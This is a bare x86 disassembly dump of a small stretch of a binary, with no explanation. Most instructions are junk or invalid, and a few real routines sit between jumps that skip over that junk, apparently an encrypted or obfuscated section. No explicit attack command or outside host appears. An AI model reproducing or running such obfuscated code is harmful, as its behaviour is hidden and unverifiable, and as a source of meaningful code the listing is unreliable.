  403930:	xchg   edx,eax
  403931:	mov    esi,0x6d22d923
  403936:	mov    dh,ch
  403938:	inc    ebx
  403939:	cs add ebx,ebp
  40393c:	hlt    
  40393d:	mov    esp,edx
  40393f:	cmp    dl,al
  403941:	push   ebp
  403942:	out    dx,al
  403943:	rol    DWORD PTR [edi-0x7b],cl
  403946:	adc    eax,0x2c43c7ca
  40394b:	mov    esp,0x70cd11bb
  403950:	aam    0x14
  403952:	hlt    
  403953:	ins    BYTE PTR es:[edi],dx
  403954:	mov    WORD PTR [ebx-0xe],?
  403957:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403958:	icebp  
  403959:	inc    ecx
  40395a:	leave  
  40395b:	jge    0x4039a0
  40395d:	leave  
  40395e:	cld    
  40395f:	dec    ecx
  403960:	(bad)  
  403962:	pop    ecx
  403963:	fwait
  403964:	in     eax,0xe5
  403966:	mov    eax,DWORD PTR [ebp-0x4dfbdc47]
  40396c:	stos   BYTE PTR es:[edi],al
  40396d:	inc    edi
  40396e:	sbb    DWORD PTR ds:0x8d3a57fd,esi
  403974:	sbb    DWORD PTR [eax+0x5b0926b],ebx
  40397a:	in     eax,dx
  40397b:	fnstcw WORD PTR [edx-0x74]
  40397e:	cli    
  40397f:	jg     0x4039c1
  403981:	jne    0x4039dd
  403983:	pop    eax
  403984:	sub    al,0x14
  403986:	mov    dl,0xb8
  403988:	xchg   ecx,eax
  403989:	(bad)  
  40398a:	push   ds
  40398b:	mov    edi,0xf92cefe5
  403990:	sbb    ch,BYTE PTR [edx-0x7737011b]
  403996:	push   cs
  403997:	dec    esi
  403998:	push   0xfd2bfe88
  40399d:	xchg   esi,eax
  40399e:	sahf   
  40399f:	add    al,0xc4
  4039a1:	ror    bl,0x41
  4039a4:	mov    cs,WORD PTR [ecx+edx*2+0x8ae0b11]
  4039ab:	pop    ebp
  4039ac:	push   eax
  4039ad:	mov    gs,WORD PTR [edx-0x59]
  4039b0:	xchg   ebp,eax
  4039b1:	cmc    
  4039b2:	bound  edx,QWORD PTR [esi+edi*2+0xb]
  4039b6:	mov    cl,ch
  4039b8:	scas   al,BYTE PTR es:[edi]
  4039b9:	iret   
  4039ba:	push   ebx
  4039bb:	dec    esp
  4039bc:	clc    
  4039bd:	or     eax,0x5cf85e3c
  4039c2:	aam    0x75
  4039c4:	fdivr  QWORD PTR [ebp-0x9]
  4039c7:	dec    ebp
  4039c8:	jecxz  0x40396e
  4039ca:	dec    ebx
  4039cb:	pop    esi
  4039cc:	sub    BYTE PTR [edi+0x31a5dfe6],dl
  4039d2:	(bad)  
  4039d3:	out    dx,eax
  4039d4:	loop   0x403985
  4039d6:	mov    ds:0x95f51b2,al
  4039db:	in     al,dx
  4039dc:	inc    ah
  4039de:	leave  
  4039df:	add    ebx,0xffffffdd
  4039e2:	adc    al,BYTE PTR [edi]
  4039e4:	(bad)  
  4039e5:	jne    0x403a4a
  4039e7:	cdq    
  4039e8:	push   esi
  4039e9:	clc    
  4039ea:	push   0xffffffef
  4039ec:	ss sub ebx,ebx
  4039ef:	jge    0x403a17
  4039f1:	and    esp,ebp
  4039f3:	iret   
  4039f4:	and    DWORD PTR [eax-0x17],esp
  4039f7:	dec    ebp
  4039f8:	add    DWORD PTR [edx+0x7c],ebp
  4039fb:	shl    BYTE PTR [esi+0x3a],cl
  4039fe:	inc    esi
  4039ff:	adc    dl,ch
  403a01:	data16 add ch,BYTE PTR ds:0xd8a957cb
  403a08:	test   al,0xd5
  403a0a:	inc    esp
  403a0b:	xlat   BYTE PTR ds:[ebx]
  403a0c:	es push 0xffffff80
  403a0f:	add    eax,eax
  403a11:	js     0x403a62
  403a13:	xor    edx,DWORD PTR [edx]
  403a15:	(bad)  
  403a16:	(bad)  [ecx-0x67ed1444]
  403a1c:	in     eax,dx
  403a1d:	xor    esi,DWORD PTR [edi+ecx*4]
  403a20:	mov    ah,BYTE PTR [edi-0x78a7e7cd]
  403a26:	leave  
  403a27:	inc    eax
  403a28:	mov    DWORD PTR [ebx+esi*2-0x26],ebp
  403a2c:	jle    0x403a76
  403a2e:	sub    al,0xc2
  403a30:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  403a32:	xor    al,BYTE PTR [edx-0x7eb0059e]
  403a38:	fsub   QWORD PTR [ecx+ebp*8]
  403a3b:	jae    0x403a1d
  403a3d:	stos   DWORD PTR es:[edi],eax
  403a3e:	mov    ebx,DWORD PTR [ebp+esi*8-0x6e0865c7]
  403a45:	aas    
  403a46:	jns    0x403a38
  403a48:	jp     0x403a08
  403a4a:	leave  
  403a4b:	pop    ds
  403a4c:	loop   0x403a99
  403a4e:	push   ss
  403a4f:	dec    ebx
  403a50:	mov    edi,DWORD PTR [ebp-0x4]
  403a53:	jmp    0x403c5f
  403a58:	addr16 jo 0x403aaa
  403a5b:	or     BYTE PTR [ebx+0x33],cl
  403a5e:	arpl   WORD PTR [ebx+0x3c],si
  403a61:	aas    
  403a62:	cwde   
  403a63:	pop    ss
  403a64:	aad    0x2
  403a66:	and    ebx,esp
  403a68:	gs push ds
  403a6a:	jl     0x403ae8
  403a6c:	ins    DWORD PTR es:[edi],dx
  403a6d:	jg     0x403aeb
  403a6f:	jl     0x403a91
  403a71:	mov    esp,0xaa6acdd
  403a76:	push   esi
  403a77:	pop    esp
  403a78:	jl     0x403ab1
  403a7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a7b:	lods   al,BYTE PTR ds:[esi]
  403a7c:	push   ss
  403a7d:	(bad)  
  403a7e:	test   DWORD PTR [esi],ebx
  403a80:	call   0xfc05:0x52be59f7
  403a87:	xchg   edx,eax
  403a88:	jmp    0x3ec1:0xc1b62ea
  403a8f:	js     0x403ac5
  403a91:	aam    0x58
  403a93:	mov    eax,ds:0xd146c200
  403a98:	arpl   WORD PTR [edx-0xa395cc8],bp
  403a9e:	pop    es
  403a9f:	mov    DWORD PTR [ebx+0x6095ae65],edx
  403aa5:	sub    dh,BYTE PTR [ecx-0x6b]
  403aa8:	or     BYTE PTR [edx],bh
  403aaa:	mov    edi,0xc861359c
  403aaf:	jb     0x403b13
  403ab1:	dec    ebp
  403ab2:	cmp    DWORD PTR [ebp-0x2d],eax
  403ab5:	pop    edx
  403ab6:	loopne 0x403ae6
  403ab8:	jg     0x403ac7
  403aba:	rol    DWORD PTR [ebx+edx*8],1
  403abd:	in     eax,0x93
  403abf:	loop   0x403ab8
  403ac1:	push   ds
  403ac2:	sub    eax,eax
  403ac4:	xchg   esi,eax
  403ac5:	mov    esi,0xc753d62e
  403aca:	cdq    
  403acb:	mov    BYTE PTR ds:0x4fc23d13,bh
  403ad1:	rol    DWORD PTR [ebp+0x23b11178],cl
  403ad7:	aam    0xbe
  403ad9:	jno    0x403aa2
  403adb:	rcr    ebp,1
  403add:	jecxz  0x403b55
  403adf:	repnz push eax
  403ae1:	popf   
  403ae2:	lahf   
  403ae3:	mov    WORD PTR [ebp-0x350350da],gs
  403ae9:	sbb    DWORD PTR [eax+0x41],edx
  403aec:	cmc    
  403aed:	jecxz  0x403b24
  403aef:	retf   
  403af0:	inc    ebp
  403af1:	sub    ebx,edi
  403af3:	jg     0x403ad2
  403af5:	jno    0x403aa8
  403af7:	sub    eax,0x8afb407e
  403afc:	or     BYTE PTR [eax],ch
  403afe:	pusha  
  403aff:	call   0xeb82:0xacd4f81
  403b06:	push   es
  403b07:	cmp    BYTE PTR [ebp+0x2e0e877b],0x4b
  403b0e:	pop    ebp
  403b0f:	call   0x3aa7d612
  403b14:	je     0x403ae5
  403b16:	jno    0x403ae2
  403b18:	or     eax,0x971b6349
  403b1d:	scas   al,BYTE PTR es:[edi]
  403b1e:	xchg   esp,eax
  403b1f:	add    BYTE PTR [ebp-0xfe49b8e],0x8e
  403b26:	adc    al,0xda
  403b28:	mov    ebp,0x1cf8fb0c
  403b2d:	mov    ch,0x95
  403b2f:	sbb    al,0x95
  403b31:	out    dx,al
  403b32:	in     al,0xe4
  403b34:	mov    al,BYTE PTR [ebp-0x31]
  403b37:	(bad)  
  403b38:	jmp    0xfb19549b
  403b3d:	retf   
  403b3e:	ret    
  403b3f:	jns    0x403b96
  403b41:	or     al,0xbf
  403b43:	shr    DWORD PTR [edi+0x3f],0xf6
  403b47:	and    al,0x2d
  403b49:	xchg   ebp,eax
  403b4a:	mov    esi,0x7e773930
  403b50:	mov    dh,0xb6
  403b52:	mov    ah,0x4e
  403b54:	sahf   
  403b55:	div    DWORD PTR [ebx]
  403b57:	gs in  eax,dx
  403b59:	jae    0x403bae
  403b5b:	sbb    eax,DWORD PTR [ebp+ecx*1-0x744e51b5]
  403b62:	xchg   esp,eax
  403b63:	loopne 0x403bc4
  403b65:	out    dx,al
  403b66:	inc    edx
  403b67:	enter  0x1b91,0xd1
  403b6b:	nop
  403b6c:	dec    ebp
  403b6d:	cli    
  403b6e:	dec    ecx
  403b6f:	test   al,0x42
  403b71:	pusha  
  403b72:	inc    eax
  403b73:	in     al,dx
  403b74:	loop   0x403afc
  403b76:	ror    cl,cl
  403b78:	dec    ecx
  403b79:	sub    esp,DWORD PTR [edx+0x12230430]
  403b7f:	in     eax,0xb5
  403b81:	jp     0x403bb1
  403b83:	fsubr  DWORD PTR [eax+0x79d12ed6]
  403b89:	inc    ebx
  403b8a:	daa    
  403b8b:	jb     0x403b9a
  403b8d:	aas    
  403b8e:	pop    esi
  403b8f:	dec    ecx
  403b90:	xlat   BYTE PTR ds:[ebx]
  403b91:	xor    edx,esi
  403b93:	cdq    
  403b94:	add    al,0xb3
  403b96:	jns    0x403b27
  403b98:	inc    esi
  403b99:	stc    
  403b9a:	in     eax,0xad
  403b9c:	dec    ebp
  403b9d:	(bad)  
  403b9f:	cmp    al,0xa8
  403ba2:	das    
  403ba3:	(bad)  
  403ba4:	mov    ebx,0xb516b0de
  403ba9:	addr16 cdq 
  403bab:	sbb    BYTE PTR [eax+ecx*4-0x6d652835],ah
  403bb2:	call   0x74dc5e11
  403bb7:	adc    al,0x64
  403bb9:	sbb    eax,0x12776c25
  403bbe:	jecxz  0x403b65
  403bc0:	dec    eax
  403bc1:	sub    bh,bl
  403bc3:	mov    bl,0x61
  403bc5:	into   
  403bc6:	cli    
  403bc7:	leave  
  403bc8:	or     BYTE PTR [ecx],cl
  403bca:	ja     0x403bb7
  403bcc:	js     0x403bc9
  403bce:	(bad)  
  403bcf:	loop   0x403c01
  403bd1:	jp     0x403b92
  403bd3:	enter  0x2feb,0x8f
  403bd7:	cld    
  403bd8:	mulps  xmm3,XMMWORD PTR [esi-0x261006ac]
  403bdf:	lock mov ah,0x60
  403be2:	push   cs
  403be3:	cmp    al,0x63
  403be5:	in     eax,0x9
  403be7:	(bad)  
  403be8:	in     al,0xcd
  403bea:	mov    al,0xe6
  403bec:	mov    ah,0x9a
  403bee:	mov    esi,0x3ac79bda
  403bf3:	stos   DWORD PTR es:[edi],eax
  403bf4:	xchg   edx,eax
  403bf6:	neg    DWORD PTR [esi+0x7d65e0e8]
  403bfc:	pop    edi
  403bfd:	shr    esi,cl
  403bff:	sbb    BYTE PTR [eax],bh
  403c01:	dec    edi
  403c02:	add    eax,0xae3adfe6
  403c07:	aas    
  403c08:	xchg   esp,eax
  403c09:	js     0x403baf
  403c0b:	popa   
  403c0c:	pushfw 
  403c0e:	in     al,0xa8
  403c10:	fisttp WORD PTR [ecx]
  403c12:	mov    dh,0x4b
  403c14:	inc    esi
  403c15:	lahf   
  403c16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c17:	jnp    0x403c6a
  403c19:	fisubr DWORD PTR [edx+0x68]
  403c1c:	dec    esp
  403c1d:	rol    al,cl
  403c1f:	mov    ds,eax
  403c21:	dec    edi
  403c22:	retf   0xe1a1
  403c25:	bound  ebx,QWORD PTR [edx-0x7b8ef48c]
  403c2b:	pop    ds
  403c2c:	inc    edi
  403c2d:	push   es
  403c2e:	inc    esi
  403c2f:	adc    al,0x9c
  403c31:	mov    ah,0x4b
  403c33:	cmp    al,0xb3
  403c35:	aad    0x56
  403c37:	hlt    
  403c38:	jecxz  0x403bde
  403c3a:	(bad)
  403c3e:	xor    eax,esp
  403c40:	push   edi
  403c41:	mov    eax,0xe0a05a30
  403c46:	cmp    eax,0xe64ab8d7
  403c4b:	mov    ebx,0xdfaaca92
  403c50:	dec    edx
  403c51:	pop    ecx
  403c52:	or     esi,DWORD PTR [esi]
  403c54:	sub    DWORD PTR [ebx],eax
  403c56:	shl    DWORD PTR [eax+0x61],0x6d
  403c5a:	dec    ecx
  403c5b:	aaa    
  403c5c:	enter  0xe265,0x33
  403c60:	stc    
  403c61:	add    edi,esi
  403c63:	mov    esi,DWORD PTR [ebp+0x8]
  403c66:	imul   edi,edx
  403c69:	mov    ebx,DWORD PTR [ebp+0xc]
  403c6c:	xor    eax,ecx
  403c6e:	add    eax,edx
  403c70:	mov    al,BYTE PTR [ebx+eax*1+0x32729a]
  403c77:	mov    BYTE PTR [edi+esi*1],al
  403c7a:	mov    eax,DWORD PTR [ebp-0x4]
  403c7d:	xor    eax,ecx
  403c7f:	lea    edx,[edx+eax*1+0x32729a]
  403c86:	mov    eax,DWORD PTR [ebp-0x4]
  403c89:	xor    eax,ecx
  403c8b:	mov    esi,0xffcd8d66
  403c90:	jmp    0x403e9c
  403c95:	dec    edi
  403c96:	push   ss
  403c97:	sbb    eax,DWORD PTR [ebp+ebp*2+0x7d]
  403c9b:	jae    0x403cae
  403c9d:	sti    
  403c9e:	adc    ebp,DWORD PTR ds:0xd7e6d597
  403ca4:	cmovp  ebx,DWORD PTR [eax]
  403ca7:	jl     0x403d25
  403ca9:	ins    DWORD PTR es:[edi],dx
  403caa:	jg     0x403d28
  403cac:	jl     0x403cd1
  403cae:	fstp   DWORD PTR [eax]
  403cb0:	fwait
  403cb1:	push   edi
  403cb2:	or     bh,ch
  403cb4:	imul   edx,DWORD PTR [edi],0xffffffdc
  403cb7:	xchg   edx,eax
  403cb8:	push   0x6a782df8
  403cbd:	(bad)  
  403cbe:	stos   BYTE PTR es:[edi],al
  403cbf:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  403cc1:	and    al,0xea
  403cc3:	neg    BYTE PTR [edx+0x556062b8]
  403cc9:	shl    DWORD PTR [ebx-0xd4aee71],0xd4
  403cd0:	jg     0x403d3d
  403cd2:	dec    ecx
  403cd3:	jmp    0xe5240d2
  403cd8:	jl     0x403caf
  403cda:	daa    
  403cdb:	dec    eax
  403cdc:	sub    BYTE PTR [esi+0x211b573d],0xb5
  403ce3:	and    edx,DWORD PTR [edi+ebx*1+0x1]
  403ce7:	lahf   
  403ce8:	push   esp
  403ce9:	aam    0x2c
  403ceb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cec:	xlat   BYTE PTR ds:[ebx]
  403ced:	sbb    BYTE PTR [ecx-0x46],al
  403cf0:	mov    ebx,0xea80458c
  403cf5:	(bad)  
  403cf7:	pmaddwd mm2,QWORD PTR [edi-0x570dd10a]
  403cfe:	test   BYTE PTR [eax-0x68],bh
  403d01:	xchg   DWORD PTR [ebp+edi*4+0x782ebff3],edi
  403d08:	call   0x2e6671fc
  403d0d:	push   esi
  403d0e:	cmp    dl,bl
  403d10:	in     eax,0x92
  403d12:	iret   
  403d13:	pop    ebx
  403d14:	push   esi
  403d15:	loop   0x403d7c
  403d17:	mov    BYTE PTR [ebx+0x3],cl
  403d1a:	pop    eax
  403d1b:	add    ch,BYTE PTR [ecx+0x3f]
  403d1e:	or     BYTE PTR [ebx],dh
  403d20:	cdq    
  403d21:	ins    BYTE PTR es:[edi],dx
  403d22:	not    al
  403d24:	les    ebp,FWORD PTR [esi+0x60]
  403d27:	(bad)  
  403d28:	std    
  403d29:	push   ds
  403d2a:	daa    
  403d2b:	shl    esi,1
  403d2d:	jecxz  0x403da7
  403d2f:	mov    BYTE PTR [esi-0x140c7150],dh
  403d35:	and    DWORD PTR [ebx+0x30],esp
  403d38:	in     al,0x85
  403d3a:	jno    0x403d39
  403d3c:	cmp    eax,0xac74cc3d
  403d41:	inc    ecx
  403d42:	push   0xb0c3ee7c
  403d47:	sub    eax,0x557453f4
  403d4c:	sbb    bl,BYTE PTR [eax+0x7d8db567]
  403d52:	aam    0xe1
  403d54:	clc    
  403d55:	in     al,0x6d
  403d57:	adc    ah,dh
  403d59:	int    0x1c
  403d5b:	ins    DWORD PTR es:[edi],dx
  403d5c:	jl     0x403d20
  403d5e:	or     DWORD PTR [ebx],0xffffffb1
  403d61:	sbb    DWORD PTR [edx-0x79],0x32e69c4e
  403d68:	mov    eax,ds:0x68630649
  403d6d:	ret    
  403d6e:	xor    dl,al
  403d70:	sbb    eax,0x1f47c7d5
  403d75:	lds    esp,FWORD PTR [esi-0xbbafbc2]
  403d7b:	xor    al,0x72
  403d7d:	scas   eax,DWORD PTR es:[edi]
  403d7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d7f:	mov    esp,0x1d29170
  403d84:	jmp    ebp
  403d86:	repnz (bad) 
  403d88:	pop    DWORD PTR [edx]
  403d8a:	mov    dl,0x84
  403d8c:	(bad)  
  403d8e:	sub    eax,0x9ca2f949
  403d93:	in     al,dx
  403d94:	fld    QWORD PTR [ecx+ecx*8+0x75586c5a]
  403d9b:	inc    ebx
  403d9c:	adc    BYTE PTR [edx-0x7f4f915e],al
  403da2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403da3:	sub    eax,0x9d431c32
  403da8:	mov    eax,0x300dfa7c
  403dad:	imul   BYTE PTR [edx+0x31]
  403db0:	or     al,0x8c
  403db2:	xlat   BYTE PTR ds:[ebx]
  403db3:	xor    ebp,DWORD PTR [esi]
  403db5:	cmp    esp,esi
  403db7:	xor    cl,0x7d
  403dba:	fcom   QWORD PTR [eax+0x34e4e1f9]
  403dc0:	rcl    BYTE PTR [ebx],cl
  403dc2:	nop
  403dc3:	jmp    0x786506c1
  403dc8:	xchg   edx,eax
  403dc9:	pop    edx
  403dca:	mov    ah,0x52
  403dcc:	fnstenv [ebx+0x3e89be0c]
  403dd2:	mov    ds:0x596c04f8,al
  403dd7:	jp     0x403da9
  403dd9:	mov    ebp,0x1d18fe
  403dde:	jnp    0x403e2a
  403de0:	pop    ss
  403de1:	sahf   
  403de2:	jp     0x403e4b
  403de4:	loop   0x403df9
  403de6:	gs inc eax
  403de8:	push   eax
  403de9:	mov    esi,0xd5e608
  403dee:	fnstcw WORD PTR [edx]
  403df0:	fs in  al,0xe7
  403df3:	xor    BYTE PTR [ebx-0x4091265e],dh
  403df9:	sti    
  403dfa:	push   edx
  403dfb:	addr16 ret 0xc3ff
  403dff:	sbb    ch,0x76
  403e02:	cmp    al,0xd7
  403e04:	and    ch,BYTE PTR [esi-0x66f596e5]
  403e0a:	fs mov bl,0x58
  403e0d:	sub    al,bl
  403e0f:	inc    ebp
  403e10:	push   edx
  403e11:	sub    al,0x62
  403e13:	sbb    DWORD PTR [ebp+eax*4+0x1d],esp
  403e17:	clc    
  403e18:	mov    ebp,0xe7102263
  403e1d:	lods   eax,DWORD PTR ds:[esi]
  403e1e:	jns    0x403de2
  403e20:	pop    es
  403e21:	mov    dh,0x4a
  403e23:	and    DWORD PTR [edx],esp
  403e25:	pop    ecx
  403e26:	dec    ebp
  403e27:	fadd   st,st(4)
  403e29:	xor    DWORD PTR [edx+0x28844919],0xffffffed
  403e30:	mov    ch,0x52
  403e32:	shl    cl,0xaf
  403e35:	push   0xa32a8666
  403e3a:	mov    BYTE PTR [edi],cl
  403e3c:	xlat   BYTE PTR ds:[ebx]
  403e3d:	add    edi,DWORD PTR [ebp+0xf38579f]
  403e43:	mov    ebp,0xbfd72572
  403e48:	mov    ds:0xae4482fa,eax
  403e4d:	jbe    0x403e93
  403e4f:	ror    DWORD PTR [ecx+eiz*4],1
  403e52:	shl    BYTE PTR ds:0x7cbe48b2,1
  403e58:	sbb    edi,DWORD PTR [ebp-0x65f972e2]
  403e5e:	adc    dl,BYTE PTR [esi]
  403e60:	(bad)  
  403e61:	ja     0x403dfc
  403e63:	cmp    esp,DWORD PTR [ecx+0x1a]
  403e66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e67:	(bad)  
  403e68:	xchg   esp,eax
  403e69:	pop    ebp
  403e6a:	push   ds
  403e6b:	in     al,0x1d
  403e6d:	xchg   ebp,eax
  403e6e:	scas   al,BYTE PTR es:[edi]
  403e6f:	cli    
  403e70:	in     eax,dx
  403e71:	xchg   ebp,eax
  403e72:	mov    WORD PTR [ebp-0x4b4caa5d],gs
  403e78:	sbb    DWORD PTR [ebx],0x10
  403e7b:	push   0x13d89f5
  403e80:	sbb    DWORD PTR [edi+ebp*4-0x23],esp
  403e84:	xor    eax,0x88ae23ba
  403e89:	pop    eax
  403e8a:	jne    0x403eb9
  403e8c:	add    ch,BYTE PTR [ecx*8-0x2f8e6ac9]
  403e93:	aas    
  403e94:	sbb    eax,DWORD PTR [ebx+edx*2-0x4c16d757]
  403e9b:	lea    ebp,[ebx]
  403e9d:	lock add esi,DWORD PTR [ebp+0x10]
  403ea1:	cmp    edx,esi
  403ea3:	jbe    0x403630
  403ea9:	pop    ebx
  403eaa:	mov    eax,0xf89c8534
  403eaf:	pop    edi
  403eb0:	pop    esi
  403eb1:	leave  
  403eb2:	ret    0xc
  403eb5:	push   ebp
  403eb6:	mov    ebp,esp
  403eb8:	mov    eax,DWORD PTR [ebp+0xc]
  403ebb:	xor    edx,edx
  403ebd:	mov    ecx,0x7264fcad
  403ec2:	div    ecx
  403ec4:	mov    ecx,DWORD PTR [ebp+0x10]
  403ec7:	and    ecx,eax
  403ec9:	jmp    0x4040d5
  403ece:	(bad)  
  403ecf:	addr16 jns 0x403f24
  403ed2:	icebp  
  403ed3:	jb     0x403f28
  403ed5:	ins    DWORD PTR es:[edi],dx
  403ed6:	add    al,0x2a
  403ed8:	pop    esi
  403ed9:	push   0x37407a38
  403ede:	mov    ebx,0x6d7c7c1a
  403ee3:	jg     0x403f61
  403ee5:	jl     0x403f59
  403ee7:	mov    ds:0xdc26bace,eax
  403eec:	faddp  st(1),st
  403eee:	or     esp,DWORD PTR [ebp+0x14bf9560]
  403ef4:	aam    0x46
  403ef6:	pop    ecx
  403ef7:	push   cs
  403ef8:	and    eax,0x242e41a8
  403efd:	dec    esi
  403efe:	inc    ebp
  403eff:	inc    edx
  403f00:	popf   
  403f01:	outs   dx,BYTE PTR ds:[esi]
  403f02:	push   ebp
  403f03:	cwde   
  403f04:	push   cs
  403f05:	loopne 0x403ed5
  403f07:	inc    edi
  403f08:	push   es
  403f09:	arpl   WORD PTR [edx-0x2fe8a3d7],bx
  403f0f:	xor    DWORD PTR ds:0xe913b0d9,edx
  403f15:	and    al,0x57
  403f17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f18:	jno    0x403ef3
  403f1a:	sbb    DWORD PTR [edi-0x7e37d175],eax
  403f20:	add    eax,0x5d3155a1
  403f25:	(bad)  
  403f26:	cmc    
  403f27:	or     BYTE PTR [ecx-0x68c13ad],ah
  403f2d:	imul   bl
  403f2f:	shl    BYTE PTR [ebx+0x4c],cl
  403f32:	fistp  DWORD PTR [esp+edi*2-0x285a59b4]
  403f39:	mov    ebp,0xbf72d64b
  403f3e:	mov    BYTE PTR [edx-0x4d],cl
  403f41:	jge    0x403ee2
  403f43:	scas   eax,DWORD PTR es:[edi]
  403f44:	push   ds
  403f45:	retf   0x1e74
  403f48:	and    DWORD PTR ds:0x8dda6db4,ebp
  403f4e:	sub    bl,bl
  403f50:	clc    
  403f51:	test   BYTE PTR [ebx+0x5e],cl
  403f54:	adc    edx,DWORD PTR [edx+ecx*1-0x27dfea2]
  403f5b:	loope  0x403ee6
  403f5d:	or     edx,DWORD PTR [edi+0x30909d09]
  403f63:	dec    edx
  403f64:	repnz lods eax,DWORD PTR ds:[esi]
  403f66:	mov    DWORD PTR ds:0xbb0146df,esp
  403f6c:	cmp    cl,BYTE PTR ds:0xd174d061
  403f72:	push   ebp
  403f73:	scas   eax,DWORD PTR es:[edi]
  403f74:	or     DWORD PTR [edx+0x4d],0xffffffa3
  403f78:	sti    
  403f79:	push   0x47bdead2
  403f7e:	lds    esp,FWORD PTR [ecx]
  403f80:	out    0x98,eax
  403f82:	das    
  403f83:	div    edx
  403f85:	pop    ss
  403f86:	gs adc eax,0x19a44b78
  403f8c:	(bad)  
  403f8d:	call   0x52ae06af
  403f92:	lods   eax,DWORD PTR ds:[esi]
  403f93:	inc    eax
  403f94:	enter  0xdf4e,0x16
  403f98:	push   0x590a9b3c
  403f9d:	jns    0x403f35
  403f9f:	jno    0x403fde
  403fa1:	mov    ds:0x5e09fb70,al
  403fa6:	and    al,dl
  403fa8:	jno    0x403fac
  403faa:	add    ebx,DWORD PTR [ebp+0x521973ae]
  403fb0:	or     DWORD PTR [ecx+0x4a86253],esp
  403fb6:	push   ecx
  403fb7:	add    cl,BYTE PTR [eax]
  403fb9:	push   esp
  403fba:	push   edx
  403fbb:	jnp    0x403f5f
  403fbd:	dec    ebx
  403fbe:	adc    edi,DWORD PTR ds:0xcc3da1b7
  403fc4:	mov    edx,0x61c8ab65
  403fc9:	shl    BYTE PTR [edx+0x49],cl
  403fcc:	cli    
  403fcd:	pop    ebp
  403fce:	sar    BYTE PTR [ebp+0x655d8f52],0xe1
  403fd5:	fbstp  TBYTE PTR [edx+ebp*2+0x70]
  403fd9:	jb     0x403f62
  403fdb:	addr16 in eax,dx
  403fdd:	(bad)  
  403fdf:	outs   dx,DWORD PTR ds:[esi]
  403fe0:	adc    BYTE PTR [ebx+0x633f71c7],0x81
  403fe7:	je     0x404038
  403fe9:	or     al,0x2d
  403feb:	jb     0x40405d
  403fed:	ins    DWORD PTR es:[edi],dx
  403fee:	push   ebx
  403fef:	out    0x81,eax
  403ff1:	sbb    edi,DWORD PTR [ecx-0x1e]
  403ff4:	push   cs
  403ff5:	imul   ebp,DWORD PTR [edi],0x1
  403ff8:	jp     0x404048
  403ffa:	inc    ebx
  403ffb:	xor    BYTE PTR [esi],dl
  403ffd:	jb     0x403fca
  403fff:	adc    DWORD PTR [ebx],ecx
  404001:	pop    edi
  404002:	shr    BYTE PTR [edx],cl
  404004:	jo     0x404006
  404006:	shr    DWORD PTR [eax],1
  404008:	adc    DWORD PTR [eax+0x7ce66c6d],esp
  40400e:	inc    esp
  40400f:	mov    al,ds:0xac65efe3
  404014:	add    cl,BYTE PTR fs:[ebx]
  404017:	mov    cl,0x9a
  404019:	mov    bl,0x6b
  40401b:	cmc    
  40401c:	mov    BYTE PTR [esi-0x1d4a422a],dl
  404022:	scas   al,BYTE PTR es:[edi]
  404023:	shl    ebp,cl
  404025:	lahf   
  404026:	pop    eax
  404027:	(bad)  
  404028:	into   
  404029:	in     al,0x59
  40402b:	lea    edi,[edi+eax*1]
  40402e:	cld    
  40402f:	sub    ah,BYTE PTR [ebp-0x5cfe23c2]
  404035:	jmp    0xa285:0xa02abc06
  40403c:	mov    al,0x81
  40403e:	daa    
  40403f:	cld    
  404040:	stos   BYTE PTR es:[edi],al
  404041:	fcmovu st,st(1)
  404043:	xor    DWORD PTR [edi+ebp*2],edi
  404046:	push   cs
  404047:	ds ins BYTE PTR es:[edi],dx
  404049:	push   0x3843989d
  40404e:	dec    ecx
  40404f:	inc    esp
  404050:	lds    ebx,FWORD PTR [esi+0x2d]
  404053:	cmp    DWORD PTR [edx+ecx*8-0x1194036e],edx
  40405a:	jecxz  0x4040aa
  40405c:	call   0x77fd:0x45b8f47e
  404063:	push   edi
  404064:	arpl   di,dx
  404066:	pop    esi
  404067:	dec    edx
  404068:	ja     0x404041
  40406a:	(bad)  
  40406b:	adc    DWORD PTR [ebx-0x384b5fa8],ecx
  404071:	or     al,0x3a
  404073:	imul   eax,DWORD PTR [eax],0xffffffd8
  404076:	xchg   ecx,eax
  404077:	dec    esp
  404078:	add    DWORD PTR [ebx+0x2a918898],ebp
  40407e:	loope  0x404087
  404080:	dec    esi
  404081:	in     eax,0x57
  404083:	je     0x404078
  404085:	push   es
  404086:	mov    ebx,0x8cd02978
  40408b:	ins    BYTE PTR es:[edi],dx
  40408c:	mov    ds:0x58237291,eax
  404091:	rcl    DWORD PTR [ebx],1
  404093:	pop    ebx
  404094:	pusha  
  404095:	test   DWORD PTR [eax],ebp
  404097:	sub    BYTE PTR [edi],bh
  404099:	inc    edi
  40409a:	(bad)  
  40409b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40409c:	xor    ebp,DWORD PTR fs:0xe2f5931a
  4040a3:	addr16 retf 0x1606
  4040a7:	and    DWORD PTR [esi+0x21139623],esi
  4040ad:	enter  0xdb95,0x14
  4040b1:	nop
  4040b2:	test   al,0x66
  4040b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040b5:	test   DWORD PTR [edx+0x17],edx
  4040b8:	mov    ss,WORD PTR [eax]
  4040ba:	lock sbb eax,0x292f467
  4040c0:	mov    fs,WORD PTR [esi]
  4040c2:	js     0x4040c9
  4040c4:	ret    
  4040c5:	cld    
  4040c6:	fmul   QWORD PTR [ebp-0x29]
  4040c9:	fiadd  WORD PTR [ebx]
  4040cb:	dec    esp
  4040cc:	dec    edx
  4040cd:	jae    0x4040ea
  4040cf:	adc    eax,edx
  4040d1:	inc    ebp
  4040d2:	repnz mov dl,0xaf
  4040d5:	or     ecx,0x81161d8f
  4040db:	mov    eax,ecx
  4040dd:	pop    ebp
  4040de:	ret    0x18
  4040e1:	push   ebp
  4040e2:	mov    ebp,esp
  4040e4:	sub    esp,0x58
  4040e7:	xor    DWORD PTR ds:0x433733,0x2c9d
  4040f1:	mov    ecx,DWORD PTR [ebp+0x8]
